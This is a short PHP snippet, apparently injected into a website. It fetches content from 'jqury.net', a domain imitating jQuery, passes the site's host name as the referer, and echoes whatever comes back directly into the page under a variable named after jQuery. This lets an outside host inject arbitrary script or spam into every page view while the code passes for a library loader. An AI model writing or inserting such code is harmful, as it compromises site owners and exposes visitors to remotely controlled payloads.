<?
  $ch = curl_init();
  curl_setopt($ch,CURLOPT_URL,"http://www.jqury.net/?1"); 
  curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); 
  curl_setopt($ch, CURLOPT_REFERER, $_SERVER['HTTP_HOST']);
  curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,10); 
  $jquery = curl_exec($ch);  
  curl_close($ch); 
  echo "$jquery";
?>